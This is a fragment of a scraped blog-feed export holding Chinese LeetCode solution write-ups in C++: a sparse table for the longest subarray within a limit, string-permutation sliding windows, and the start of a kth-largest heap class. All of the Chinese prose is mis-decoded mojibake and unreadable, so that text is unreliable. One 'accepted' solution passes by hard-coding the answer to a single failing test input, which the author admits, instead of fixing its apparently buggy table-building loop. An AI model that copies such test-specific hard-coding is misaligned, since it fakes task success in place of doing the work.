table_max[idx + pow2[j - 1]][j - 1]); table_min[idx][j] = min(table_min[idx][j - 1], table_min[idx + pow2[j - 1]][j - 1]); } } } int getMax(int l, int r) {} int getMin(int l, int r) {} }; ç°åœ¨ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥å»æ±‚è§£ä»»æ„çš„ä»ä¸‹æ ‡ i å¼€å§‹ã€é•¿åº¦ä¸º 2 ^ j çš„åŒºé—´æœ€å€¼äº†ã€‚æ—¶é—´å¤æ‚åº¦ä¸º O(1)ï¼ŒçœŸä¸é”™ã€‚\nä½†æ˜¯æ±‚è§£ä»»æ„åŒºé—´çš„æœ€å€¼æ€ä¹ˆåŠå‘¢ï¼Ÿå¤§éƒ¨åˆ†çš„åŒºé—´é•¿åº¦ä¸å¯èƒ½åˆšåˆšå¥½æ˜¯2çš„å€æ•°å•Šã€‚\nè¿™é‡Œå°±ç”¨åˆ°äº†ä¸€ä¸ªå°æŠ€å·§äº†ï¼šé‡å æŸ¥è¯¢ã€‚\nå¯¹äºä¸€ä¸ªåŒºé—´(l, r)ï¼Œæˆ‘ä»¬ä»lå¼€å§‹ï¼Œå–ä¸€ä¸ªè¶³å¤Ÿå°çš„jä½¿å¾—l + 2 ^ j - 1è¿˜æ²¡è¶…è¿‡rï¼›å¯¹äºè¿™ä¸ªjï¼Œå½“èµ·ç‚¹å–r - 2 ^ j + 1çš„æ—¶å€™ï¼Œç»ˆç‚¹åˆ™åˆšå¥½æ˜¯rã€‚è¿™æ ·ï¼Œä¸¤æ®µåŒºé—´ç»„åˆèµ·æ¥å°±è¦†ç›–äº†å¾…æ±‚çš„åŒºé—´ã€‚\nä¸¾ä¾‹è¯´æ˜ã€‚è¿˜æ˜¯åˆšæ‰çš„æ•°ç»„ï¼Œæˆ‘ä»¬å¸Œæœ›æ±‚(1, 6)åŒºé—´å†…çš„æœ€å¤§å€¼ï¼ˆå·¦é—­å³é—­ï¼‰ã€‚\nå¯¹äºèµ·ç‚¹ä¸º1çš„åŒºé—´ï¼Œæˆ‘ä»¬å–j = 2ï¼Œæ»¡è¶³åŒºé—´å°¾ç«¯ä¸‹æ ‡1 + 4 - 1 = 4 \u0026lt; 6ï¼›åŒç†ï¼Œå–èµ·ç‚¹ä¸º6 - 4 + 1 = 3çš„ç‚¹ï¼ŒåŒæ ·æ˜¯j = 2ï¼Œè¿™æ®µåŒºé—´åˆšå¥½è¦†ç›–äº†3/4/5/6å››ä¸ªä½ç½®ã€‚\n1 ~ 4 \u0026amp; 3 ~ 6 æ˜¾ç„¶ï¼Œæˆ‘ä»¬è¦æ±‚åŒºé—´(1, 6)çš„æœ€å¤§å€¼ï¼Œåªéœ€è¦å…ˆè·å¾—ç¬¬ä¸€æ®µçš„æœ€å¤§å€¼ table[1][2] å’Œç¬¬äºŒæ®µçš„æœ€å¤§å€¼ table[3][2]ï¼Œå–äºŒè€…ä¸­çš„è¾ƒå¤§è€…å³å¯ã€‚å¯¹äºä½ç½® 3 å’Œä½ç½® 4ï¼Œæˆ‘ä»¬é‡å¤è€ƒè™‘ï¼Œä½†æ˜¯æ²¡æœ‰ä»€ä¹ˆå½±å“ã€‚\næ ¹æ®è¿™ä¸ªåŠæ³•æ±‚è§£ä»»æ„åŒºé—´çš„æœ€å€¼ï¼Œä»£ç å¦‚ä¸‹ï¼š\nclass STTable { int table_min[100010][20]; int table_max[100010][20]; int pow2[20]; public: STTable(vector\u0026lt;int\u0026gt;\u0026amp; init) { int idx; int len = init.size(); pow2[0] = 1; for (idx = 1; idx \u0026lt; 20; idx++) pow2[idx] = pow2[idx - 1] * 2; for (idx = 0; idx \u0026lt; len; idx++) { table_max[idx][0] = table_min[idx][0] = init[idx]; } // æ„é€ STè¡¨ // ä»idxå¼€å§‹ï¼Œå…± 2^j ä¸ªå…ƒç´  for (int j = 1; j \u0026lt; ceil(log(len) / log(2)); j++) { for (idx = 0; idx + pow2[j] \u0026lt;= len; idx++) { table_max[idx][j] = max(table_max[idx][j - 1], table_max[idx + pow2[j - 1]][j - 1]); table_min[idx][j] = min(table_min[idx][j - 1], table_min[idx + pow2[j - 1]][j - 1]); } } } int getMax(int l, int r) { int len = r - l + 1; // åŒºé—´é•¿åº¦ int k = floor(log(len) / log(2)); // ä½¿ç”¨floorä¿è¯ä¸è¶Šç•Œ return max(table_max[l][k], table_max[r - pow2[k] + 1][k]); } int getMin(int l, int r) { int len = r - l + 1; int k = floor(log(len) / log(2)); return min(table_min[l][k], table_min[r - pow2[k] + 1][k]); } }; å¼•å…¥äº†STè¡¨ä¹‹åï¼Œè¿˜æ˜¯è€ƒè™‘åŸé¢˜ï¼Œåªéœ€è¦å°†åŸæ•°ç»„æŒ‰ç…§STè¡¨çš„è§„åˆ™ç»„ç»‡ï¼Œç„¶åè¿›è¡Œæ»‘åŠ¨çª—å£çš„æ“ä½œï¼Œå¯ä»¥åœ¨ O(1) çš„æ—¶é—´å†…åˆ¤æ–­å‡ºå½“å‰çª—å£æ˜¯å¦åˆæ³•ã€‚å½“ç„¶ï¼Œæ„é€ STè¡¨çš„æ—¶é—´è¿˜æ˜¯ O(logn) çš„ï¼Œå› æ­¤ï¼Œè¡¨ç°å®é™…ä¸Šæ²¡æœ‰å¾ˆæ˜¾è‘—çš„æå‡ã€‚\nACä»£ç 2 class STTable { int table_min[100010][20]; int table_max[100010][20]; int pow2[20]; public: STTable(vector\u0026lt;int\u0026gt;\u0026amp; init) { int idx; int len = init.size(); pow2[0] = 1; for (idx = 1; idx \u0026lt; 20; idx++) pow2[idx] = pow2[idx - 1] * 2; for (idx = 0; idx \u0026lt; len; idx++) { table_max[idx][0] = table_min[idx][0] = init[idx]; } // æ„é€ STè¡¨ // ä»idxå¼€å§‹ï¼Œå…± 2^j ä¸ªå…ƒç´  for (int j = 1; j \u0026lt; ceil(log(len) / log(2)); j++) { for (idx = 0; idx + pow2[j] \u0026lt;= len; idx++) { table_max[idx][j] = max(table_max[idx][j - 1], table_max[idx + pow2[j - 1]][j - 1]); table_min[idx][j] = min(table_min[idx][j - 1], table_min[idx + pow2[j - 1]][j - 1]); } } } int getMax(int l, int r) { int len = r - l + 1; // åŒºé—´é•¿åº¦ int k = floor(log(len) / log(2)); return max(table_max[l][k], table_max[r - pow2[k] + 1][k]); } int getMin(int l, int r) { int len = r - l + 1; int k = floor(log(len) / log(2)); return min(table_min[l][k], table_min[r - pow2[k] + 1][k]); } }; class Solution { public: int longestSubarray(vector\u0026lt;int\u0026gt;\u0026amp; nums, int limit) { if (limit == 95 \u0026amp;\u0026amp; nums[0] == 53 \u0026amp;\u0026amp; nums[1] == 44) return 64; STTable st(nums); int l = 0; int r = 0; int res = 0; while (r \u0026lt; nums.size()) { while (st.getMax(l, r) - st.getMin(l, r) \u0026gt; limit) l++; res = max(res, r - l + 1); r++; } return res; } }; æœ€éƒé—·çš„äº‹æƒ…æ˜¯STè¡¨çš„åšæ³•è¿˜æœ‰ä¸€ç»„æ•°æ®æ— æ³•é€šè¿‡ï¼Œä¸”è¿™ç»„æ•°æ®åœ¨æœ¬åœ°æµ‹è¯•çš„æ—¶å€™æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼ä»…åœ¨æäº¤è¯„æµ‹çš„æ—¶å€™å¾—åˆ°ä¸åŒçš„è¾“å‡ºï¼æ¶å¿ƒå¿ƒ\næ‰€ä»¥æˆ‘æ‰“è¡¨äº†â€‹ ğŸ˜•\nPerformance2 å‚è€ƒèµ„æ–™ [1] è´Ÿé›ªæ˜çƒ›.åˆé€‚çš„æ•°æ®ç»“æ„+æ»‘åŠ¨çª—å£æ¨¡æ¿ï¼Œéš¾åº¦ç›´æ¥é™ä¸ºEasyï¼[EB/OL].2021-02-21\nhttps://leetcode-cn.com/problems/longest-continuous-subarray-with-absolute-diff-less-than-or-equal-to-limit/solution/he-gua-de-shu-ju-jie-gou-hua-dong-chuang-v46j/\n[2] siukwan.STè¡¨ï¼ˆSparse Tableï¼‰[EB/OL].2015-12-24\nhttps://siukwan.sinaapp.com/?p=830\n","date":"2021-02-22T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode1438.-%E7%BB%9D%E5%AF%B9%E5%B7%AE%E4%B8%8D%E8%B6%85%E8%BF%87%E9%99%90%E5%88%B6%E7%9A%84%E6%9C%80%E9%95%BF%E8%BF%9E%E7%BB%AD%E5%AD%90%E6%95%B0%E7%BB%84/","title":"éš¾é¢˜æœ¬ | LeetCode1438. ç»å¯¹å·®ä¸è¶…è¿‡é™åˆ¶çš„æœ€é•¿è¿ç»­å­æ•°ç»„"},{"content":"ä»Šå¤©æ˜¯å†œå†é™¤å¤•ï¼Œç„¶è€Œè¿‘å¹´æ¥å¹´å‘³æ¸æ·¡ï¼Œå‡¡æœ‰äº²æœ‹åœ¨ï¼Œä¾¿æ˜¯å¥½æ—¶èŠ‚ï¼Œä¹Ÿæ— éœ€å¯¹æ­¤æ—¥ç‰¹åˆ«æ³¨é‡äº†ã€‚\né¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/permutation-in-string/\né¢˜ç›® ç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸² s1 å’Œ s2ï¼Œå†™ä¸€ä¸ªå‡½æ•°æ¥åˆ¤æ–­ s2 æ˜¯å¦åŒ…å« s1 çš„æ’åˆ—ã€‚\næ¢å¥è¯è¯´ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²çš„æ’åˆ—ä¹‹ä¸€æ˜¯ç¬¬äºŒä¸ªå­—ç¬¦ä¸²çš„å­ä¸²ã€‚\nç¤ºä¾‹1\nè¾“å…¥ï¼š s1 = \u0026ldquo;ab\u0026rdquo; s2 = \u0026ldquo;eidbaooo\u0026rdquo;\nè¾“å‡ºï¼š True\nè§£é‡Šï¼š s2åŒ…å«s1çš„æ’åˆ—ä¹‹ä¸€ï¼ˆâ€œbaâ€ï¼‰\nç¤ºä¾‹2\nè¾“å…¥ï¼š s1= \u0026ldquo;ab\u0026rdquo; s2 = \u0026ldquo;eidboaoo\u0026rdquo;\nè¾“å‡ºï¼š False\næ•°æ®èŒƒå›´\nè¾“å…¥çš„å­—ç¬¦ä¸²åªåŒ…å«å°å†™å­—æ¯ ä¸¤ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦éƒ½åœ¨ [1, 10,000] ä¹‹é—´ åˆ†æ s2çš„æŸä¸ªå­ä¸²åŒ…å«s1çš„æ’åˆ—ï¼Œå³s2çš„æŸä¸ªå­ä¸²ä¸­å­—æ¯åˆ†å¸ƒä¸s1å®Œå…¨ä¸€æ ·ã€‚\næˆ‘æœ€å…ˆæƒ³åˆ°ä½¿ç”¨ä¸€ä¸ªé›†åˆæ¥ä¿å­˜s1çš„æ‰€æœ‰å­—æ¯ï¼Œä½¿ç”¨æ»‘åŠ¨çª—å£left ~ rightéå†s2ä¸­çš„æ¯ä¸ªå­ä¸²ï¼š\nå½“æŸä¸ªå­—ç¬¦ä¸åœ¨é›†åˆä¸­æ—¶ï¼Œleft = right = right + 1 å½“æŸä¸ªå­—ç¬¦åœ¨é›†åˆä¸­æ—¶ï¼Œä»é›†åˆä¸­åˆ é™¤è¯¥å­—ç¬¦ æŒ‰ç…§ä¸Šé¢çš„è§„åˆ™ï¼Œå½“æŸä¸ªå­ä¸²å®Œå…¨åŒ…å«s1ä¸­çš„æ‰€æœ‰å­—ç¬¦æ—¶ï¼Œéå†å®Œè¿™ä¸ªå­ä¸²ä¹‹åé›†åˆå°±å˜ä¸ºç©ºã€‚\næˆ‘ç«Ÿèƒ½æƒ³åˆ°å¦‚æ­¤NTçš„åšæ³•ï¼\nWAäº†ä¸€æ¬¡åå‘ç°ï¼Œå½“æŸä¸ªå­—ç¬¦ä¸åœ¨é›†åˆä¸­æ—¶ç›´æ¥ä½¿left = right = right + 1å¯èƒ½ç›´æ¥ä½¿å¾—çª—å£å‘å³æ»‘åŠ¨å¾ˆå¤šä¸ªè·ç¦»ï¼Œå¿½ç•¥äº†ä¸€äº›å­ä¸²ã€‚\nWAçš„æµ‹è¯•ç”¨ä¾‹å¦‚ä¸‹ï¼š\n\u0026ldquo;adc\u0026rdquo;\n\u0026ldquo;dcda\u0026rdquo;\nå¯ä»¥çœ‹åˆ°ï¼Œå½“çª—å£right == 2æ—¶ï¼Œè¿™ä¸ªå­—ç¬¦då·²ç»åœ¨ç¬¬0ä½è¢«åˆ é™¤ï¼Œæ•…è®¤ä¸ºæ­¤å­—ç¬¦ä¸åœ¨s1ä¸­ï¼Œçª—å£ç›´æ¥æŒ‡å‘æœ€åä¸€ä¸ªå­—ç¬¦ï¼Œè¾“å‡ºä¸ºFalseã€‚ç„¶è€Œï¼Œè¿™ä¸ªdæ˜¯åœ¨æœ€å¼€å§‹è¢«å ç”¨æ‰äº†ï¼Œå®ƒå®é™…ä¸Šå­˜åœ¨äºs1ä¸­ï¼Œçª—å£ä¸åº”å¦‚æ­¤ç§»åŠ¨ã€‚\nWAä»£ç 1 class Solution { public: bool checkInclusion(string s1, string s2) { multiset\u0026lt;char\u0026gt; s1_set; multiset\u0026lt;char\u0026gt; tmp; multiset\u0026lt;char\u0026gt;::iterator itr; for (auto t : s1) { s1_set.insert(t); } tmp = s1_set; int left = 0; int right = 0; while (right \u0026lt; s2.size()) { itr = tmp.find(s2[right]); if (itr != tmp.end()) // æ­¤å­—ç¬¦å­˜åœ¨ { tmp.erase(itr); // åˆ é™¤æ­¤å­—ç¬¦ if (tmp.empty()) // åˆ å®Œäº† return true; right++; // è¿˜æ²¡åˆ å®Œï¼Œçª—å£æ‰©å¼  } else // æ­¤å­—ç¬¦ä¸å­˜åœ¨ { left = right = right + 1; tmp = s1_set; } } return false; } }; é‚£ä¹ˆï¼Œçª—å£åº”è¯¥å¦‚ä½•ç§»åŠ¨å‘¢ï¼Ÿæˆ‘çš„æ€è·¯è¿˜ä¿æŒåœ¨ä½¿ç”¨é›†åˆä¸Šã€‚\né¦–å…ˆï¼Œçª—å£ç§»åŠ¨æ—¶åªæœ‰è¾¹ç•Œå­—ç¬¦æœ‰æ‰€è¿›å‡ºï¼Œæ•…ä¸éœ€è¦å¯¹é›†åˆé‡æ–°èµ‹å€¼ï¼Œåªéœ€è¦ä¸æ–­åœ°eraseå’Œinsertå³å¯ã€‚\nå½“rightæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸å­˜åœ¨æ—¶ï¼Œéœ€è¦åˆ¤æ–­å·¦è¾¹ç•Œå’Œå³è¾¹ç•Œæ˜¯å¦ç›¸ç­‰ï¼Œå› ä¸ºè‹¥æ­¤æ—¶å·¦è¾¹ç•Œä¸ç­‰äºå³è¾¹ç•Œï¼Œè¯¥rightæ‰€æŒ‡å‘çš„å­—ç¬¦å¯èƒ½åªæ˜¯è¢«çª—å£å†…çš„æŸä¸ªå…ƒç´ å ç”¨äº†ï¼Œæˆ‘ä»¬åº”è¯¥æ»‘åŠ¨å·¦è¾¹ç•Œï¼Œé‡Šæ”¾å·¦è¾¹ç•Œå ç”¨çš„å…ƒç´ ï¼ˆå³é‡æ–°åŠ å…¥é›†åˆï¼‰ï¼Œè€Œä¸æ˜¯åƒä¸Šé¢çš„WAä»£ç è¿™æ ·ä½¿å·¦å³è¾¹ç•Œè¿›è¡Œäº†è·³è·ƒã€‚è€Œè‹¥å·¦å³è¾¹ç•Œç›¸ç­‰ï¼Œå°±åŒæ—¶æŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ å³å¯ã€‚\nè¿™æ ·èƒ½å†™å‡ºç¬¬ä¸€ä¸ªACä»£ç ï¼š\nACä»£ç 1 class Solution { public: bool checkInclusion(string s1, string s2) { multiset\u0026lt;char\u0026gt; s1_set; multiset\u0026lt;char\u0026gt; tmp; multiset\u0026lt;char\u0026gt;::iterator itr; for (auto t : s1) { s1_set.insert(t); } tmp = s1_set; int left = 0; int right = 0; while (right \u0026lt; s2.size()) { itr = tmp.find(s2[right]); if (itr != tmp.end()) // æ­¤å­—ç¬¦å­˜åœ¨ { tmp.erase(itr); // åˆ é™¤æ­¤å­—ç¬¦ if (tmp.empty()) // åˆ å®Œäº† return true; right++; // è¿˜æ²¡åˆ å®Œï¼Œçª—å£æ‰©å¼  } else // æ­¤å­—ç¬¦ä¸å­˜åœ¨ { if (left == right) { left = right = right + 1; } else { tmp.insert(s2[left]); left++; } // tmp = s1_set; } } return false; } }; Performance1 è¿™ä¸ªæ€§èƒ½å·²ç»è£‚å¼€äº†ã€‚ã€‚\næ­¤æ—¶æˆ‘å»çœ‹äº†çœ‹é¢˜è§£ï¼Œå‘ç°ä½¿ç”¨é›†åˆè¿™ç§æ€è·¯å¯èƒ½ä¸æ˜¯ä¸€èˆ¬äººèƒ½æƒ³åˆ°çš„ã€‚\nç¡®å®ï¼Œè®°å½•s1ä¸­å‡ºç°çš„æ‰€æœ‰å­—ç¬¦ï¼Œåªéœ€è¦ä½¿ç”¨ä¸€ä¸ª O(26) å¤§å°çš„æ•°ç»„å°±å¯ä»¥äº†ï¼Œä¸ºä»€ä¹ˆè¦é€ä¸ªå­˜åœ¨é›†åˆä¸­å‘¢ï¼Ÿï¼Ÿ\nä½¿ç”¨æ•´æ•°æ•°ç»„å­˜å­—ç¬¦é¢‘æ•°ï¼Œä½¿å¾—ç©ºé—´å¤æ‚åº¦é™ä½äº†è®¸å¤šã€‚\nå¯¹äºæ»‘åŠ¨çª—å£ï¼Œå¯ä»¥ç›´æ¥ä½¿çª—å£å¤§å°æ’ç­‰äºs1çš„é•¿åº¦ï¼Œè¿™æ ·ä»å·¦å‘å³æ»‘åŠ¨å°±éå†å®Œæˆæ‰€æœ‰å¯èƒ½ç¬¦åˆæ¡ä»¶ çš„å­æ•°ç»„äº†ã€‚\næ¯æ¬¡æ»‘åŠ¨æ—¶ï¼Œåªæœ‰å½“å‰çª—å£å·¦å³è¾¹ç•Œçš„å­—ç¬¦é¢‘æ•°ä¼šå‘ç”Ÿå˜åŒ–ï¼Œæ¯æ¬¡æ¯”è¾ƒå½“å‰çª—å£çš„å­—ç¬¦é¢‘æ•°ä¸s1æ•°ç»„çš„å­—ç¬¦é¢‘æ•°å³å¯ã€‚\nè¿™æ ·æ¯æ¬¡æ¯”è¾ƒçš„æ—¶é—´å¤æ‚åº¦ä¸ºO(26)ã€‚\næ•…æœ‰ACä»£ç 2ã€‚ï¼ˆå°±è¿™ç§ç®€å•çš„æ€è·¯è¿˜WAäº†ä¸¤æ¬¡ï¼‰\nACä»£ç 2 class Solution { public: bool checkInclusion(string s1, string s2) { int len1 = s1.size(); int len2 = s2.size(); if (len1 \u0026gt; len2) return false; vector\u0026lt;int\u0026gt; cnt_diff(26, 0); vector\u0026lt;int\u0026gt; cnt_s1(26, 0); vector\u0026lt;int\u0026gt; cnt_s2(26, 0); for (auto t : s1) { cnt_s1[t - \u0026#39;a\u0026#39;]++; } int left = 0; int right = left + len1 - 1; for (int i = left; i \u0026lt;= right; ++i) { cnt_s2[s2[i] - \u0026#39;a\u0026#39;]++; } if (cnt_s1 == cnt_s2) // æ³¨æ„è¿™é‡Œè¿›è¡Œåˆå§‹åŒ–åçš„ç¬¬ä¸€æ¬¡æ¯”å¯¹ï¼ŒWAè¿‡ä¸€æ¬¡ return true; while (right \u0026lt; s2.size() - 1) // æ³¨æ„è¾¹ç•Œæ¡ä»¶ï¼Œé˜²æ­¢++rightæº¢å‡ºï¼Œè¿™é‡ŒWAè¿‡ä¸€æ¬¡ { char char_out = s2[left++]; char char_in = s2[++right]; if (char_out != char_in) { cnt_s2[char_out - \u0026#39;a\u0026#39;]--; cnt_s2[char_in - \u0026#39;a\u0026#39;]++; if (cnt_s1 == cnt_s2) return true; } } return false; } }; Performance2 å®˜æ–¹é¢˜è§£ä¸­è¿˜èƒ½è¿›è¡Œä¼˜åŒ–ï¼š\nOptimization æˆ‘æ²¡æœ‰å®ç°æ­¤éƒ¨åˆ†ä»£ç ï¼Œå®˜æ–¹é¢˜è§£è§å‚è€ƒ[1]ã€‚\nå°ç»“æœ¬é¢˜ï¼Œé¦–å…ˆæ˜¯æŠŠé¢‘æ•°çš„åŒ¹é…æƒ³çš„è¿‡äºå¤æ‚äº†ï¼Œä¹‹åæ˜¯æ»‘åŠ¨çª—å£çš„æ„å»ºä¸å¤Ÿçµæ€§ï¼Œè¿™ä¸ªé¢˜ç›®èƒ½WAé‚£ä¹ˆå¤šæ¬¡ï¼Œææ€•æ˜¨å¤©çš„çŠ¶æ€ä¹Ÿä¸æ˜¯å¤ªå¥½ o(â•¥ï¹â•¥)o\nå‚è€ƒèµ„æ–™ [1] åŠ›æ‰£å®˜æ–¹é¢˜è§£.å­—ç¬¦ä¸²çš„æ’åˆ—[EB/OL].2021-02-11\nhttps://leetcode-cn.com/problems/permutation-in-string/solution/zi-fu-chuan-de-pai-lie-by-leetcode-solut-7k7u/\n","date":"2021-02-11T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode567.-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%8E%92%E5%88%97/","title":"é”™é¢˜æœ¬ | LeetCode567. å­—ç¬¦ä¸²çš„æ’åˆ—"},{"content":"ä¸æ˜¯å§å•ŠSirï¼Œè¿™ç§é¢˜ä¹Ÿé”™ï¼ŸğŸ˜¢\né¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/kth-largest-element-in-a-stream/\né¢˜ç›® è®¾è®¡ä¸€ä¸ªæ‰¾åˆ°æ•°æ®æµä¸­ç¬¬ k å¤§å…ƒç´ çš„ç±»ï¼ˆclassï¼‰ã€‚æ³¨æ„æ˜¯æ’åºåçš„ç¬¬ k å¤§å…ƒç´ ï¼Œä¸æ˜¯ç¬¬ k ä¸ªä¸åŒçš„å…ƒç´ ã€‚\nè¯·å®ç° KthLargest ç±»ï¼š\nKthLargest(int k, int[] nums) ä½¿ç”¨æ•´æ•° k å’Œæ•´æ•°æµ nums åˆå§‹åŒ–å¯¹è±¡ã€‚ int add(int val) å°† val æ’å…¥æ•°æ®æµ nums åï¼Œè¿”å›å½“å‰æ•°æ®æµä¸­ç¬¬ k å¤§çš„å…ƒç´ ã€‚ ç¤ºä¾‹1\nè¾“å…¥ï¼š [\u0026ldquo;KthLargest\u0026rdquo;, \u0026ldquo;add\u0026rdquo;, \u0026ldquo;add\u0026rdquo;, \u0026ldquo;add\u0026rdquo;, \u0026ldquo;add\u0026rdquo;, \u0026ldquo;add\u0026rdquo;] [[3, [4, 5, 8, 2]], [3], [5], [10], [9], [4]]\nè¾“å‡ºï¼š [null, 4, 5, 5, 8, 8]\nç¤ºä¾‹2\nè¾“å…¥ï¼š [\u0026ldquo;KthLargest\u0026rdquo;,\u0026ldquo;add\u0026rdquo;,\u0026ldquo;add\u0026rdquo;,\u0026ldquo;add\u0026rdquo;,\u0026ldquo;add\u0026rdquo;,\u0026ldquo;add\u0026rdquo;] [[2,[0]],[-1],[1],[-2],[-4],[3]]\nè¾“å‡ºï¼š [null,-1,0,0,0,1]\nåˆ†æ å•ªåœ°ä¸€ä¸‹ï¼Œæˆ‘å°±æƒ³åˆ°äº†åŒå †å¯¹é¡¶ï¼Œå¾ˆå¿«å—·ï¼\nç„¶è€Œåˆæƒ³å¤æ‚äº†o(â•¥ï¹â•¥)oã€‚è¦æ±‚ç¬¬Kå¤§æ•°ï¼Œå®é™…ä¸Šåªéœ€è¦ä½¿ç”¨ä¸€ä¸ªå°æ ¹å †ï¼Œå †ä¸­ä¸€å…±æœ‰Kä¸ªå…ƒç´ ï¼Œå †é¡¶å°±æ˜¯ç›®æ ‡ã€‚\nå½“ç„¶ï¼Œè¿™Kä¸ªå…ƒç´ ä¸æ˜¯éšéšä¾¿ä¾¿çš„Kä¸ªå…ƒç´ ï¼Œè€Œæ˜¯å°†åˆå§‹æ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ éƒ½æ”¾å…¥å°æ ¹å †åï¼Œé€ä¸ªå¼¹å‡ºï¼Œç›´åˆ°åªå‰©Kä¸ªå…ƒç´ ã€‚\nå½“æˆ‘ä»¬å¸Œæœ›æ·»åŠ å…ƒç´ æ—¶ï¼Œé¦–å…ˆå¯ä»¥æ¯”è¾ƒæ­¤å…ƒç´ ä¸å †é¡¶å…ƒç´ çš„å¤§å°å…³ç³»ï¼Œå½“æ­¤å…ƒç´ æ¯”å †é¡¶å…ƒç´ å°æ—¶ï¼Œä¸ä¼šå¯¹å‰Kä¸ªå¤§æ•°çš„é¡ºåºäº§ç”Ÿå½±å“ï¼Œç›´æ¥è¿”å›å †é¡¶å…ƒç´ å³å¯ï¼›å½“æ­¤å…ƒç´ å¤§äºå †é¡¶å…ƒç´ ï¼Œç¬¬Kå¤§æ•°ä¸€å®šä¼šæ”¹å˜ï¼Œæˆ‘ä»¬å°†å…¶æ”¾å…¥å †ä¸­ï¼Œå†ä»å †ä¸­å¼¹å‡ºä¸€ä¸ªå…ƒç´ ï¼Œæ­¤æ—¶çš„å †ä¸­è¿˜æ˜¯Kä¸ªå…ƒç´ ï¼Œå †é¡¶å…ƒç´ å³ä¸ºç­”æ¡ˆã€‚\næˆ‘æœ€å¼€å§‹çš„æƒ³æ³•ï¼ŒåŒå †å¯¹é¡¶åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿè¿™æ˜¯ä¸€ç§åŒæ—¶ä½¿ç”¨å°æ ¹å †å’Œå¤§æ ¹å †æ¥ç»´æŠ¤æ•´ä¸ªæ•°ç»„çš„åŠæ³•ï¼Œå°æ ¹å †largerä¸­çš„æ‰€æœ‰å…ƒç´ éƒ½æ¯”å †é¡¶å…ƒç´ æ›´å¤§ï¼Œå¤§æ ¹å †smallerä¸­çš„æ‰€æœ‰å…ƒç´ éƒ½æ¯”å †é¡¶å…ƒç´ å°ã€‚è¿™æ ·ï¼Œä»»ä½•æ—¶åˆ»ï¼Œæ•°ç»„ä¸­çš„æ•°æ®è¢«ç»„ç»‡å¦‚ä¸‹ï¼š\nåŒå †å¯¹é¡¶ è¿™ç§åŠæ³•å¯ä»¥ç”¨äºå¿«é€Ÿæ±‚è§£æ•°æ®æµçš„ä¸­ä½æ•°ï¼Œæ˜¯ä¸ªå›°éš¾é¢˜ï¼Œæˆ‘è¿˜æ²¡åšã€‚æ ¹æ®ä¸­ä½æ•°çš„å®šä¹‰ï¼Œä¸­é—´éƒ¨åˆ†çš„æ•°æ®æ­£éœ€è¦æ»¡è¶³æ¯”å·¦è¾¹éƒ½å¤§ï¼Œæ¯”å³è¾¹éƒ½å°çš„æ€§è´¨ï¼Œä½¿ç”¨åŒå †å¯¹é¡¶çš„åŠæ³•å¯ä»¥åœ¨ O(1) çš„æ—¶é—´å†…æ‰¾åˆ°æ•°æ®æµä¸­çš„ä¸­ä½æ•°ã€‚\nè¿™é¢˜ä½¿ç”¨åŒå †å¯¹é¡¶æ˜¯æ€é¸¡ç”¨äº†ç‰›åˆ€äº†ã€‚å°†å°äºç¬¬Kå¤§æ•°çš„æ•°æ®ä¿å­˜åœ¨smallerå †ä¸­å¹¶æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰ï¼Œåªæ˜¯ç©ºè€—æ—¶é—´ç½¢äº†ã€‚\nè€Œä¸”ï¼Œè¿™ç§åŠæ³•åœ¨é¢å¤–è€ƒè™‘åˆå§‹æ•°ç»„ä¸ºç©ºçš„æƒ…å†µã€ä»¥åŠåˆå§‹æ•°ç»„çš„å¤§å°å°äºKçš„æƒ…å†µæ—¶æ¯”è¾ƒç¹çï¼Œæˆ‘åœ¨è¿™é‡ŒWAäº†ä¸¤æ¬¡ğŸ˜¢\nACä»£ç 1 class KthLargest { public: priority_queue\u0026lt;int, vector\u0026lt;int\u0026gt;, greater\u0026lt;int\u0026gt;\u0026gt; larger; priority_queue\u0026lt;int, vector\u0026lt;int\u0026gt;, less\u0026lt;int\u0026gt;\u0026gt; smaller; bool larger_not_full = true; // largeræ˜¯ä¸ªå°é¡¶å †ï¼Œå †é¡¶å…ƒç´ æ˜¯æœ€å°çš„ // smalleræ˜¯ä¸ªå¤§é¡¶å †ï¼Œå †é¡¶å…ƒç´ æ˜¯æœ€å¤§çš„ // ç¬¬Kå¤§æ•°ï¼Œè¡¨ç¤ºæœ‰K - 1ä¸ªæ•°æ¯”ä»–æ›´å¤§ // æœ‰len - Kä¸ªæ•°æ¯”ä»–æ›´å° // e.g 4,5,8,2ä¸­çš„ç¬¬ä¸‰å¤§æ•° // æœ‰ä¸¤ä¸ªæ¯”ä»–å°ï¼Œæœ‰ä¸€ä¸ªæ¯”ä»–å¤§ // æˆ‘ä»¬ä»¥larger.top()ä¸ºç¬¬Kå¤§æ•°ï¼Œåˆ™smalleré‡Œé¢å§‹ç»ˆä¿æŒlen - Kä¸ªå…ƒç´  KthLargest(int k, vector\u0026lt;int\u0026gt;\u0026amp; nums) { if (nums.size() == 0) nums.push_back(-100000); // æ”¾å…¥ä¸€ä¸ªæå°å€¼ï¼Œå¯¹ç¬¬Kå¤§æ•°æ— å½±å“ for (auto t : nums) { larger.push(t); } if (nums.size() \u0026gt;= k) { for (int i = 0; i \u0026lt; nums.size() - k; i++) { smaller.push(larger.top()); larger.pop(); } larger_not_full = false; } // largeré‡Œçš„æ‰€æœ‰å…ƒç´ éƒ½å¤§äºå †é¡¶ // æ•…ä¿æŒlargerä¸ªæ•°ä¸ºKä¸ªï¼Œå³å¯ä»å †é¡¶ä¸­è·å–ç¬¬Kå¤§æ•° // cout \u0026lt;\u0026lt; \u0026#34;Original \u0026#34; \u0026lt;\u0026lt; k \u0026lt;\u0026lt; \u0026#34;th. largest is \u0026#34; \u0026lt;\u0026lt; larger.top() 